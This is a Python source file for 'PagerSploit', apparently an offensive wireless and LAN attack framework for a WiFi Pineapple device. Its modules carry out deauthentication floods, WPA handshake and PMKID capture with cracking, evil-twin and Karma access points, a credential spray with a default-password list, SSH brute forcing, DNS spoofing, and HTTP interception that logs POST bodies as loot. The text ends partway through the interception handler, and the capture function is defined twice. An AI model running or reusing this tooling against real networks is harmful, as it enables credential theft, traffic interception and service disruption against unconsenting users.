#!/usr/bin/env python3
"""
PagerSploit - Wireless Pentest Framework
WiFi Pineapple Pager // wickedNull
Browser UI at http://172.16.52.1:8080
"""

import os, sys, json, time, threading, subprocess, argparse
import socket, re, base64, urllib.request, urllib.parse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs, urlparse, unquote_plus

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pagerctl import Pager

STATE = {
    'active_module': 'idle', 'module_status': 'Standing by',
    'loot_count': 0, 'server_ip': '172.16.52.1', 'server_port': '8080',
    'payload_dir': '', 'log': [], 'scan_results': [], 'hosts': [],
    'jobs': {}, 'stop_events': {}, 'module_data': {},
}
STATE_LOCK = threading.Lock()

NMAP_PATH  = '/mmc/root/payloads/user/reconnaissance/pager_bjorn/lib/nmap'
AIR_PATH   = '/mmc/usr/sbin'
AC_PATH    = '/mmc/usr/bin/aircrack-ng'
MON_IFACE  = 'wlan0mon'
MON2_IFACE = 'wlan1mon'

def log(msg, level='info'):
    entry = {'time': datetime.now().strftime('%H:%M:%S'), 'level': level, 'msg': str(msg)}
    with STATE_LOCK:
        STATE['log'].append(entry)
        if len(STATE['log']) > 1000: STATE['log'] = STATE['log'][-1000:]
    print(f"[{entry['time']}] {msg}", flush=True)

def set_module(name, status='Running'):
    with STATE_LOCK:
        STATE['active_module'] = name
        STATE['module_status'] = status

def set_data(key, val):
    with STATE_LOCK: STATE['module_data'][key] = val

def get_data(key, default=None):
    with STATE_LOCK: return STATE['module_data'].get(key, default)

def get_payload_dir(): return STATE['payload_dir']
def nmap_bin(): return NMAP_PATH if os.path.exists(NMAP_PATH) else 'nmap'

def run_cmd(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired: return 'TIMEOUT'
    except Exception as e: return str(e)

def start_job(name, fn, *args, **kwargs):
    t = threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True)
    t.start()
    with STATE_LOCK: STATE['jobs'][name] = t
    return t

def make_stop(): return threading.Event()

def reg_stop(name, ev):
    with STATE_LOCK: STATE['stop_events'][name] = ev

def unreg_stop(name):
    with STATE_LOCK: STATE['stop_events'].pop(name, None); STATE['jobs'].pop(name, None)

def stop_module(name):
    with STATE_LOCK:
        ev = STATE['stop_events'].get(name)
        proc = STATE['jobs'].get(name)
    if ev: ev.set()
    if proc and hasattr(proc, 'terminate'):
        try: proc.terminate()
        except: pass
    unreg_stop(name)
    return bool(ev or proc)

def loot_path(*parts): return os.path.join(get_payload_dir(), 'loot', *parts)

def save_loot(subdir, filename, content):
    path = loot_path(subdir, filename)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb' if isinstance(content, bytes) else 'w') as f: f.write(content)
    with STATE_LOCK: STATE['loot_count'] += 1
    log(f'Loot: {filename}', 'success')
    return path

def ts(): return datetime.now().strftime('%Y%m%d_%H%M%S')


# ── WiFi ──────────────────────────────────────────────────────────────────

RECON_DB = '/mmc/root/recon/recon.db'

def _enc_str(v):
    if not v: return 'Open'
    try: v = int(v)
    except: return str(v)
    if v == 2: return 'WEP'
    has3 = bool(v & (1 << 41))
    has2 = bool(v & (1 << 34))
    if has3 and has2: return 'WPA3/2'
    if has3: return 'WPA3'
    if has2: return 'WPA2'
    if v > 0: return 'WPA'
    return 'Open'

def _fmt_mac(mac):
    m = (mac or '').replace(':','').replace('-','')
    if len(m) == 12: return ':'.join(m[i:i+2] for i in range(0,12,2)).upper()
    return mac

def _freq_to_ch(freq):
    if not freq: return 0
    freq = int(freq)
    if 2412 <= freq <= 2484: return 14 if freq==2484 else (freq-2407)//5
    if 5160 <= freq <= 5885: return (freq-5000)//5
    if 5955 <= freq <= 7115: return (freq-5950)//5+1
    return 0

def wifi_scan(band='abg', duration=20):
    import sqlite3 as _sq
    log(f'WiFi scan from recon DB ({band})...')
    set_module('WiFi Scan', f'Reading recon DB...')

    # Band frequency filters
    if band == 'bg':
        freq_where = 'AND s.freq BETWEEN 2400 AND 2500'
    elif band == 'a':
        freq_where = 'AND s.freq BETWEEN 5000 AND 6000'
    elif band == '6':
        freq_where = 'AND s.freq > 6000'
    else:
        freq_where = ''

    try:
        con = _sq.connect(f'file:{RECON_DB}?mode=ro', uri=True, timeout=5)
        con.row_factory = _sq.Row
        cur = con.cursor()

        # Query all beacon-type SSIDs — no time/scan filter, just get everything
        # pineapd is always running and always populating this DB
        cur.execute(f'''
            SELECT s.ssid, s.bssid, s.freq, s.signal, s.encryption, s.channel,
                   w.packets, s.hidden
            FROM ssid s
            LEFT JOIN wifi_device w ON s.wifi_device = w.hash
            WHERE s.type = 4 {freq_where}
            GROUP BY s.bssid
            ORDER BY s.signal DESC
            LIMIT 200
        ''')
        rows = cur.fetchall()

        # Client count: stations seen associated to each BSSID
        cur.execute('''
            SELECT s.bssid, count(DISTINCT w.mac) as cnt
            FROM ssid s
            JOIN wifi_device w ON s.wifi_device = w.hash
            WHERE s.type IN (1,2,3)
            GROUP BY s.bssid
        ''')
        client_counts = {}
        for r in cur.fetchall():
            if r['bssid']: client_counts[str(r['bssid']).upper()] = int(r['cnt'])

        con.close()
    except Exception as e:
        log(f'Recon DB read failed: {e}', 'error')
        set_module('idle', 'Scan failed'); return []

    aps = []
    seen = set()
    for row in rows:
        bssid = _fmt_mac(str(row['bssid'] or ''))
        if not bssid or bssid in seen: continue
        seen.add(bssid)
        try: ssid = bytes(row['ssid']).decode('utf-8', errors='replace') if row['ssid'] else '<hidden>'
        except: ssid = str(row['ssid'] or '<hidden>')
        ch = int(row['channel'] or 0) or _freq_to_ch(row['freq'])
        sig = int(row['signal'] or -100)
        enc = _enc_str(row['encryption'])
        clients = client_counts.get(bssid.upper(), 0)
        aps.append({'ssid':ssid,'bssid':bssid,'channel':ch,'signal':sig,
                    'encryption':enc,'clients':clients,'power':sig})

    with STATE_LOCK: STATE['scan_results'] = aps[:80]
    log(f'Scan done: {len(aps)} APs', 'success')
    set_module('idle', f'{len(aps)} APs found')
    return aps

# ── WiFi Attacks ───────────────────────────────────────────────────────────
# pineapd owns all monitor interfaces — attacks go through pineapd shell commands
# PINEAPPLE_DEAUTH_CLIENT bssid client channel  (sourced from payload env)
# PINEAPPLE_EXAMINE_BSSID bssid {seconds}       (lock channel for capture)
# PINEAPPLE_EXAMINE_RESET                        (resume channel hopping)

PINEAPPLE_CMD = '/usr/bin/pineapple_cmd'  # pineapd IPC binary

def _pineapple(cmd, *args):
    """Call a pineapd command. Falls back to sourcing shell env if binary absent."""
    try:
        full = [PINEAPPLE_CMD, cmd] + [str(a) for a in args]
        r = subprocess.run(full, capture_output=True, text=True, timeout=10)
        return r.stdout.strip()
    except FileNotFoundError:
        # pineapd commands are shell functions — call via bash -c sourcing env
        shell_cmd = ' '.join([cmd] + [f'"{a}"' for a in args])
        r = subprocess.run(['bash','-c',f'source /etc/pineapple/config 2>/dev/null; {shell_cmd}'],
            capture_output=True, text=True, timeout=10)
        return r.stdout.strip()
    except Exception as e:
        log(f'pineapple cmd error: {e}', 'error')
        return ''

def wifi_deauth(bssid, channel='6', count='0', client='FF:FF:FF:FF:FF:FF'):
    """Deauth via pineapd — owns the radio, handles injection natively."""
    stop = make_stop(); reg_stop('deauth', stop)
    def _run():
        log(f'Deauth: {bssid} ch{channel} target={client}', 'warn')
        set_module('Deauth', bssid)
        if count == '0':
            # Continuous — repeat every 2s until stopped
            while not stop.is_set():
                _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, client, channel)
                stop.wait(2)
        else:
            _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, client, channel)
        log('Deauth stopped', 'info')
        set_module('idle', 'Deauth done')
        unreg_stop('deauth')
    start_job('deauth', _run)
    return stop

def wifi_capture(bssid, channel, ssid='capture'):
    """Lock pineapd to AP channel for handshake capture. pcap lives in /root/loot/handshakes/."""
    stop = make_stop(); reg_stop('capture', stop)
    name = re.sub(r'[^a-zA-Z0-9_-]','_', ssid)
    hs_dir = '/root/loot/handshakes'
    os.makedirs(hs_dir, exist_ok=True)
    def _run():
        log(f'Capture: {ssid} ({bssid}) ch{channel}', 'info')
        set_module('Capture', ssid)
        # Lock pineapd onto this channel — it will capture handshakes passively
        _pineapple('PINEAPPLE_EXAMINE_BSSID', bssid)
        with STATE_LOCK:
            STATE['module_data']['capture_bssid'] = bssid
            STATE['module_data']['capture_ssid'] = ssid
            STATE['module_data']['capture_dir'] = hs_dir
        # Simultaneously deauth to force handshake
        _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
        # Poll for new .pcap / .22000 files in handshakes dir
        seen = set(os.listdir(hs_dir))
        deadline = time.time() + 300  # 5 min max
        while not stop.is_set() and time.time() < deadline:
            current = set(os.listdir(hs_dir))
            new = current - seen
            for f in new:
                if bssid.replace(':','').lower() in f.lower() or ssid.lower() in f.lower():
                    log(f'HANDSHAKE CAPTURED: {f}', 'success')
                    with STATE_LOCK: STATE['loot_count'] += 1
                    seen = current
            stop.wait(5)
        _pineapple('PINEAPPLE_EXAMINE_RESET')
        log('Capture stopped', 'info')
        set_module('idle', 'Capture done')
        unreg_stop('capture')
    start_job('capture', _run)
    return stop, hs_dir

def wifi_capture(bssid, channel, ssid='capture'):
    stop = make_stop(); reg_stop('capture', stop)
    name = re.sub(r'[^a-zA-Z0-9_-]','_',ssid)
    pfx = loot_path('handshakes', f'{name}_{ts()}')
    os.makedirs(loot_path('handshakes'), exist_ok=True)
    def _run():
        log(f'Capture: {ssid} ({bssid}) ch{channel}','info'); set_module('Capture', ssid)
        try: subprocess.run(['iw','dev',MON_IFACE,'set','channel',str(channel)],stderr=subprocess.DEVNULL)
        except: pass
        proc = subprocess.Popen(
            [f'{AIR_PATH}/airodump-ng','--bssid',bssid,'--channel',str(channel),
             '--write',pfx,'--output-format','pcap',MON_IFACE],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        with STATE_LOCK: STATE['jobs']['airodump']=proc; STATE['module_data']['capture_file']=pfx+'-01.cap'
        cap_file = pfx+'-01.cap'
        while not stop.is_set():
            if os.path.exists(cap_file):
                r = subprocess.run([AC_PATH,'-w','/dev/null',cap_file],capture_output=True,text=True,timeout=5)
                if 'handshake' in r.stdout.lower():
                    log(f'HANDSHAKE: {ssid}','success')
                    with STATE_LOCK: STATE['loot_count']+=1
            stop.wait(5)
        proc.terminate(); log('Capture stopped','info'); set_module('idle','Capture done'); unreg_stop('capture')
    start_job('capture', _run); return stop, pfx+'-01.cap'

def wifi_crack(cap_file, wordlist):
    stop = make_stop(); reg_stop('crack', stop)
    output = []; set_data('crack_output', output)
    def _run():
        log(f'Cracking: {os.path.basename(cap_file)}','info'); set_module('Cracking', os.path.basename(cap_file))
        try:
            proc = subprocess.Popen([AC_PATH,'-w',wordlist,cap_file],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
            with STATE_LOCK: STATE['jobs']['aircrack']=proc
            for line in proc.stdout:
                if stop.is_set(): proc.terminate(); break
                output.append(line.rstrip())
                if 'KEY FOUND' in line:
                    log(f'KEY FOUND: {line}','success')
                    with STATE_LOCK: STATE['loot_count']+=1
                    save_loot('credentials',f'crack_{ts()}.txt','\n'.join(output))
            proc.wait()
        except Exception as e: log(f'Crack error: {e}','error')
        set_module('idle','Crack done'); unreg_stop('crack')
    start_job('crack', _run); return stop, output

def wifi_probe_harvest(duration=60):
    """Read probe requests from recon.db (type=5 = probe request)."""
    import sqlite3 as _sq
    stop = make_stop(); reg_stop('probe_harvest', stop)
    def _run():
        log('Probe harvest from recon DB','info'); set_module('Probe Harvest','Reading...')
        deadline = time.time() + duration
        probes = {}
        while not stop.is_set() and time.time() < deadline:
            try:
                con = _sq.connect(f'file:{RECON_DB}?mode=ro', uri=True, timeout=3)
                con.row_factory = _sq.Row
                cur = con.cursor()
                cur.execute('''
                    SELECT w.mac, s.ssid FROM ssid s
                    JOIN wifi_device w ON s.wifi_device = w.hash
                    WHERE s.type = 5 AND s.ssid IS NOT NULL
                ''')
                for row in cur.fetchall():
                    mac = _fmt_mac(str(row['mac'] or ''))
                    try: ssid = bytes(row['ssid']).decode('utf-8',errors='replace') if row['ssid'] else ''
                    except: ssid = str(row['ssid'] or '')
                    if mac and ssid:
                        if mac not in probes: probes[mac] = []
                        if ssid not in probes[mac]: probes[mac].append(ssid)
                con.close()
            except Exception as e: log(f'Probe DB: {e}','error')
            stop.wait(10)
        result=[{'mac':m,'probes':s} for m,s in probes.items()]
        set_data('probe_results',result)
        if result: save_loot('scans',f'probes_{ts()}.json',json.dumps(result,indent=2))
        log(f'Probe harvest: {len(probes)} devices','success')
        set_module('idle',f'{len(probes)} devices'); unreg_stop('probe_harvest')
    start_job('probe_harvest',_run); return stop

def wifi_beacon_flood(ssids):
    """Add SSIDs to pineapd SSID pool and start advertising (beacon flood)."""
    stop = make_stop(); reg_stop('beacon_flood',stop)
    def _run():
        log(f'Beacon flood: {len(ssids)} SSIDs via SSID pool','warn')
        set_module('Beacon Flood',f'{len(ssids)} SSIDs')
        # Add to pineapd SSID pool and start broadcasting
        for ssid in ssids:
            _pineapple('PINEAPPLE_SSID_POOL_ADD', ssid)
        _pineapple('PINEAPPLE_SSID_POOL_START')
        stop.wait()
        _pineapple('PINEAPPLE_SSID_POOL_STOP')
        log('Beacon flood stopped','info')
        set_module('idle','Flood stopped'); unreg_stop('beacon_flood')
    start_job('beacon_flood',_run); return stop

def wifi_wps_scan():
    """WPS scan via recon.db — pineapd captures WPS IEs in beacon/probe frames."""
    import sqlite3 as _sq
    log('WPS scan from recon DB','info'); set_module('WPS Scan','Scanning...')
    output=[]
    try:
        con = _sq.connect(f'file:{RECON_DB}?mode=ro', uri=True, timeout=5)
        con.row_factory = _sq.Row
        cur = con.cursor()
        # wifi_device table has a 'wps' column in some firmware versions
        # Check columns first
        cur.execute('PRAGMA table_info(wifi_device)')
        cols = [r['name'] for r in cur.fetchall()]
        if 'wps' in cols:
            cur.execute('SELECT w.mac, w.freq, s.ssid, s.channel, s.signal, w.wps FROM wifi_device w LEFT JOIN ssid s ON s.wifi_device=w.hash WHERE w.wps IS NOT NULL AND s.type=4 GROUP BY w.mac')
            for row in cur.fetchall():
                output.append({'bssid':_fmt_mac(str(row['mac'] or '')),'channel':row['channel'] or _freq_to_ch(row['freq']),'rssi':row['signal'] or -100,'ssid':str(row['ssid'] or ''),'wps_info':str(row['wps'] or '')})
        else:
            # Fallback: return all APs — WPS detection not available in this firmware
            log('WPS column not in recon.db — showing all APs','warn')
            cur.execute('SELECT s.bssid, s.channel, s.freq, s.signal, s.ssid FROM ssid s WHERE s.type=4 GROUP BY s.bssid ORDER BY s.signal DESC LIMIT 50')
            for row in cur.fetchall():
                output.append({'bssid':_fmt_mac(str(row['bssid'] or '')),'channel':row['channel'] or _freq_to_ch(row['freq']),'rssi':row['signal'] or -100,'ssid':str(row['ssid'] or ''),'wps_info':'unknown'})
        con.close()
    except Exception as e: log(f'WPS scan: {e}','error')
    if output: save_loot('scans',f'wps_{ts()}.json',json.dumps(output,indent=2))
    set_data('wps_results',output)
    log(f'WPS: {len(output)} APs','success'); set_module('idle',f'{len(output)} APs')
    return output

def wifi_karma(channel='6', ssids=None):
    """Karma via pineapd MIMIC — responds to probe requests with matching AP."""
    stop=make_stop(); reg_stop('karma',stop)
    def _run():
        log('Karma/MIMIC started via pineapd','warn'); set_module('Karma','Responding...')
        # PINEAPPLE_MIMIC makes pineapd respond to all probe requests
        _pineapple('PINEAPPLE_MIMIC_START')
        if ssids:
            for ssid in ssids:
                _pineapple('PINEAPPLE_SSID_POOL_ADD', ssid)
            _pineapple('PINEAPPLE_SSID_POOL_START')
        stop.wait()
        _pineapple('PINEAPPLE_MIMIC_STOP')
        if ssids: _pineapple('PINEAPPLE_SSID_POOL_STOP')
        log('Karma stopped','info'); set_module('idle','Karma stopped'); unreg_stop('karma')
    start_job('karma',_run); return stop

def wifi_auth_flood(bssid, channel='6'):
    """Auth flood via repeated deauth — pineapd handles injection."""
    stop=make_stop(); reg_stop('auth_flood',stop)
    def _run():
        log(f'Auth flood (deauth loop): {bssid}','warn'); set_module('Auth Flood',bssid)
        # Rapid repeated deauth is the practical equivalent on this hardware
        while not stop.is_set():
            _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
            stop.wait(1)
        log('Auth flood stopped','info'); set_module('idle','Flood stopped'); unreg_stop('auth_flood')
    start_job('auth_flood',_run); return stop

def wifi_evil_twin(ssid, channel='6', portal_file=None):
    """Evil twin via pineapd Open AP (wlan0open / br-evil). Captive portal optional."""
    import shutil
    stop=make_stop(); reg_stop('evil_twin',stop)
    def _run():
        log(f'Evil twin: {ssid} ch{channel}','warn'); set_module('Evil Twin',ssid)
        # Use pineapd open AP — br-evil is 10.0.0.1/24
        _pineapple('PINEAPPLE_OPEN_AP_START', ssid, channel)
        time.sleep(2)
        # Capture portal traffic on br-evil
        subprocess.run(['nft','add','table','ip','ps_eviltwin'],stderr=subprocess.DEVNULL)
        subprocess.run(['nft','add','chain','ip','ps_eviltwin','prerouting',
            '{','type','nat','hook','prerouting','priority','-100',';','}'],stderr=subprocess.DEVNULL)
        subprocess.run(['nft','add','rule','ip','ps_eviltwin','prerouting','iif','br-evil',
            'tcp','dport','80','dnat','to','10.0.0.1:8888'],stderr=subprocess.DEVNULL)
        portal_proc=None
        if portal_file and os.path.exists(portal_file):
            os.makedirs('/tmp/ps_portal',exist_ok=True)
            shutil.copy(portal_file,'/tmp/ps_portal/index.html')
            portal_proc=subprocess.Popen([sys.executable,'-m','http.server','8888',
                '--directory','/tmp/ps_portal'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        stop.wait()
        if portal_proc: portal_proc.terminate()
        subprocess.run(['nft','delete','table','ip','ps_eviltwin'],stderr=subprocess.DEVNULL)
        _pineapple('PINEAPPLE_OPEN_AP_STOP')
        log('Evil twin stopped','info'); set_module('idle','Twin stopped'); unreg_stop('evil_twin')
    start_job('evil_twin',_run); return stop

def wifi_channel_hop(band='2'):
    """Channel hopping is handled natively by pineapd. Use SET_BANDS to configure."""
    log(f'Channel hopping already active via pineapd (band={band})','info')
    # pineapd does tri-band channel hopping by default — just set bands
    band_arg = '2' if band == '2' else ('5' if band == '5' else '26')
    _pineapple('PINEAPPLE_SET_BANDS', band_arg)
    set_module('idle', f'pineapd hopping band={band}')
    # Return a dummy stop event
    stop = make_stop(); reg_stop('channel_hop', stop); stop.set(); unreg_stop('channel_hop')
    return stop

def wifi_pmkid(bssid, channel):
    """PMKID capture: lock pineapd to AP, deauth to trigger PMKID exchange.
    Handshakes (incl. PMKID) auto-captured to /root/loot/handshakes/ by pineapd."""
    stop=make_stop(); reg_stop('pmkid',stop)
    hs_dir='/root/loot/handshakes'
    os.makedirs(hs_dir,exist_ok=True)
    def _run():
        log(f'PMKID/handshake capture: {bssid} ch{channel}','info')
        set_module('PMKID',bssid)
        # Lock pineapd to this AP's channel
        _pineapple('PINEAPPLE_EXAMINE_BSSID', bssid)
        # Send deauth to force clients to re-associate (triggers PMKID/4-way HS)
        _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
        seen = set(os.listdir(hs_dir))
        deadline = time.time() + 120
        while not stop.is_set() and time.time() < deadline:
            current = set(os.listdir(hs_dir))
            new = current - seen
            for f in new:
                if bssid.replace(':','').lower() in f.lower():
                    log(f'PMKID/HS captured: {f}','success')
                    with STATE_LOCK: STATE['loot_count']+=1
                    seen = current
            stop.wait(5)
        _pineapple('PINEAPPLE_EXAMINE_RESET')
        log('PMKID done','info'); set_module('idle','PMKID done'); unreg_stop('pmkid')
    start_job('pmkid',_run); return stop

# ── LAN ───────────────────────────────────────────────────────────────────
def lan_arp_scan(subnet='172.16.52.0/24'):
    log(f'ARP scan: {subnet}','info'); set_module('ARP Scan',subnet)
    out=run_cmd([nmap_bin(),'-sn','--send-ip',subnet],timeout=90)
    hosts=[]
    for line in out.splitlines():
        if 'Nmap scan report' in line:
            hosts.append({'ip':line.split()[-1].strip('()'),'mac':'','vendor':'','hostname':''})
        elif 'MAC Address' in line and hosts:
            parts=line.split('MAC Address:')[1].strip().split(' ',1)
            hosts[-1]['mac']=parts[0]
            if len(parts)>1: hosts[-1]['vendor']=parts[1].strip('()')
    with STATE_LOCK: STATE['hosts']=hosts
    if hosts: save_loot('scans',f'arp_{ts()}.json',json.dumps(hosts,indent=2))
    log(f'ARP: {len(hosts)} hosts','success'); set_module('idle',f'{len(hosts)} hosts')
    return hosts

def lan_port_scan(target, ports='1-1024'):
    log(f'Port scan: {target}','info'); set_module('Port Scan',target)
    out=run_cmd([nmap_bin(),'-p',ports,'--open','-sV','--host-timeout','120s',target],timeout=180)
    results=[{'port':p.split()[0],'state':p.split()[1],'service':' '.join(p.split()[2:])} for p in out.splitlines() if '/tcp' in p and 'open' in p]
    out_file=save_loot('scans',f'portscan_{target}_{ts()}.txt',out)
    set_data('last_portscan',{'target':target,'results':results,'raw':out,'file':out_file})
    log(f'Port scan {target}: {len(results)} open','success'); set_module('idle',f'{len(results)} ports open')
    return results, out

def lan_service_scan(target):
    log(f'Service scan: {target}','info'); set_module('Service Scan',target)
    out=run_cmd([nmap_bin(),'-sV','-sC','-p-','--open','--host-timeout','300s',target],timeout=360)
    save_loot('scans',f'service_{target}_{ts()}.txt',out)
    set_data('last_servicescan',{'target':target,'raw':out})
    log(f'Service scan done: {target}','success'); set_module('idle','Service scan done')
    return out

def lan_os_detect(target):
    log(f'OS detect: {target}','info'); set_module('OS Detect',target)
    out=run_cmd([nmap_bin(),'-O','--osscan-guess',target],timeout=120)
    result={'target':target,'raw':out,'os':''}
    for line in out.splitlines():
        if 'OS details' in line or 'Running:' in line:
            result['os']=line.split(':',1)[1].strip() if ':' in line else line
    set_data('os_detect',result)
    log(f'OS detect done: {target}','success'); set_module('idle',result['os'][:30] or 'Done')
    return result

def lan_banner_grab(target):
    ports=[21,22,23,25,80,110,143,443,3306,5432,6379,8080,8443]
    log(f'Banner grab: {target}','info'); set_module('Banner Grab',target)
    results=[]
    for port in ports:
        try:
            s=socket.socket(); s.settimeout(3); s.connect((target,port))
            try:
                if port in [80,8080]: s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner=s.recv(256).decode('utf-8',errors='replace').strip()[:200]
            except: banner=''
            s.close()
            if banner: results.append({'port':port,'banner':banner})
        except: pass
    set_data('banners',results)
    if results: save_loot('scans',f'banners_{target}_{ts()}.json',json.dumps(results,indent=2))
    log(f'Banners {target}: {len(results)}','success'); set_module('idle',f'{len(results)} banners')
    return results

def lan_ping_sweep(subnet):
    log(f'Ping sweep: {subnet}','info'); set_module('Ping Sweep',subnet)
    out=run_cmd([nmap_bin(),'-sn','-PE','--send-ip',subnet],timeout=60)
    hosts=[line.split()[-1].strip('()') for line in out.splitlines() if 'report for' in line]
    set_data('ping_sweep',hosts)
    save_loot('scans',f'ping_{ts()}.txt','\n'.join(hosts))
    log(f'Ping sweep: {len(hosts)} up','success'); set_module('idle',f'{len(hosts)} up')
    return hosts

def lan_default_creds(target):
    CREDS=[('admin','admin'),('admin','password'),('admin','1234'),('admin','12345'),('admin',''),
           ('root','root'),('root','toor'),('root',''),('user','user'),('admin','admin123'),
           ('guest','guest'),('pi','raspberry'),('ubnt','ubnt'),('cisco','cisco')]
    results=[]; log(f'Cred spray: {target}','warn'); set_module('Cred Spray',target)
    for user,pwd in CREDS:
        try:
            req=urllib.request.Request(f'http://{target}/')
            req.add_header('Authorization','Basic '+base64.b64encode(f'{user}:{pwd}'.encode()).decode())
            resp=urllib.request.urlopen(req,timeout=3)
            if resp.status==200:
                results.append({'service':'http-basic','user':user,'pass':pwd})
                log(f'HTTP CREDS: {user}:{pwd}','success')
                with STATE_LOCK: STATE['loot_count']+=1
        except: pass
    for user,pwd in CREDS[:6]:
        for path in ['/','/login','/admin','/cgi-bin/login.cgi']:
            try:
                data=urllib.parse.urlencode({'username':user,'password':pwd}).encode()
                resp=urllib.request.urlopen(urllib.request.Request(f'http://{target}{path}',data=data),timeout=3)
                body=resp.read(1024).decode('utf-8',errors='replace')
                if any(k in body.lower() for k in ['logout','dashboard','welcome']):
                    results.append({'service':f'form{path}','user':user,'pass':pwd})
                    log(f'FORM CREDS: {path} {user}:{pwd}','success')
                    with STATE_LOCK: STATE['loot_count']+=1
            except: pass
    if results: save_loot('credentials',f'creds_{target}_{ts()}.json',json.dumps(results,indent=2))
    set_module('idle',f'{len(results)} found'); return results

def lan_ssh_brute(target, port=22):
    log(f'SSH brute: {target}:{port}','warn'); set_module('SSH Brute',f'{target}:{port}')
    results=[]
    out=run_cmd([nmap_bin(),'-p',str(port),'--script','ssh-brute',target],timeout=120)
    for line in out.splitlines():
        if 'Valid credentials' in line or 'successful' in line.lower():
            results.append({'service':'ssh','raw':line}); log(f'SSH: {line}','success')
    try:
        s=socket.socket(); s.settimeout(3); s.connect((target,port))
        banner=s.recv(256).decode('utf-8',errors='replace').strip()[:100]; s.close()
        if not results: results.append({'service':'ssh','banner':banner})
    except: pass
    if results: save_loot('credentials',f'ssh_{target}_{ts()}.json',json.dumps(results,indent=2))
    set_module('idle',f'{len(results)} results'); return results

def lan_smb_enum(target):
    log(f'SMB enum: {target}','info'); set_module('SMB Enum',target)
    out=run_cmd([nmap_bin(),'-p','445,139','--script','smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode',target],timeout=120)
    save_loot('scans',f'smb_{target}_{ts()}.txt',out)
    set_data('smb_enum',{'target':target,'raw':out})
    log(f'SMB done: {target}','success'); set_module('idle','SMB done'); return out

def lan_snmp_walk(target, community='public'):
    log(f'SNMP: {target}','info'); set_module('SNMP Walk',target)
    snmpwalk=subprocess.run(['which','snmpwalk'],capture_output=True,text=True).stdout.strip()
    out=run_cmd([snmpwalk,'-v2c','-c',community,target],timeout=60) if snmpwalk else \
        run_cmd([nmap_bin(),'-sU','-p','161','--script','snmp-info,snmp-sysdescr',f'--script-args=snmpcommunity={community}',target],timeout=90)
    save_loot('scans',f'snmp_{target}_{ts()}.txt',out)
    set_data('snmp_out',out)
    log(f'SNMP done: {target}','success'); set_module('idle','SNMP done'); return out

def lan_ssl_cert(target, port=443):
    log(f'SSL cert: {target}:{port}','info'); set_module('SSL Cert',f'{target}:{port}')
    out=run_cmd([nmap_bin(),'-p',str(port),'--script','ssl-cert,ssl-enum-ciphers',target],timeout=60)
    result={'target':target,'port':port,'raw':out,'subject':'','issuer':'','expiry':''}
    for line in out.splitlines():
        if 'Subject:' in line: result['subject']=line.split('Subject:',1)[1].strip()
        if 'Issuer:' in line: result['issuer']=line.split('Issuer:',1)[1].strip()
        if 'Not valid after' in line: result['expiry']=line.split(':',1)[1].strip()
    set_data('ssl_cert',result)
    log(f'SSL done: {target}','success'); set_module('idle','SSL done'); return result

def lan_mdns_discover():
    log('mDNS/SSDP discovery','info'); set_module('mDNS','Listening...')
    devices=[]
    ssdp='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
        sock.settimeout(5); sock.sendto(ssdp.encode(),('239.255.255.250',1900))
        while True:
            try:
                data,addr=sock.recvfrom(2048)
                info=data.decode('utf-8',errors='replace')
                server=next((l.split(':',1)[1].strip() for l in info.splitlines() if l.lower().startswith('server:')),'')
                devices.append({'ip':addr[0],'protocol':'SSDP','server':server})
            except socket.timeout: break
        sock.close()
    except Exception as e: log(f'SSDP: {e}','error')
    set_data('mdns_devices',devices)
    if devices: save_loot('scans',f'mdns_{ts()}.json',json.dumps(devices,indent=2))
    log(f'mDNS: {len(devices)} devices','success'); set_module('idle',f'{len(devices)} devices')
    return devices

def lan_dns_spoof(domain, redirect_ip):
    log(f'DNS spoof: {domain} -> {redirect_ip}','warn')
    with open('/tmp/ps_dns_spoof.conf','a') as f: f.write(f'address=/{domain}/{redirect_ip}\n')
    subprocess.run(['killall','-HUP','dnsmasq'],stderr=subprocess.DEVNULL)
    subprocess.run(['killall','-HUP','dnsmasq.hak5'],stderr=subprocess.DEVNULL)
    log(f'DNS spoof active: {domain}','success'); return True

def lan_http_intercept(iface='wlan0'):
    stop=make_stop(); reg_stop('http_intercept',stop)
    ilog=loot_path('credentials',f'http_{ts()}.log')
    os.makedirs(loot_path('credentials'),exist_ok=True)
    log('HTTP intercept started','warn'); set_module('HTTP Intercept','Active')
    subprocess.run(['sysctl','-w','net.ipv4.ip_forward=1'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','table','ip','ps_intercept'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','chain','ip','ps_intercept','prerouting','{','type','nat','hook','prerouting','priority','-100',';','}'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','rule','ip','ps_intercept','prerouting','iif',iface,'tcp','dport','80','redirect','to',':8181'],stderr=subprocess.DEVNULL)
    class _H(BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _rec(self,method,body=''):
            entry=f'[{datetime.now().strftime("%H:%M:%S")}] {method} {self.headers.get("Host","")}{self.path} from {self.client_address[0]} | {body[:300]}\n'
            with open(ilog,'a') as f: f.write(entry)
            log(entry.strip()[:80],'info' if method=='GET' else 'success')
            if method=='POST':
                with STATE_LOCK: STATE['loot_count']+=1
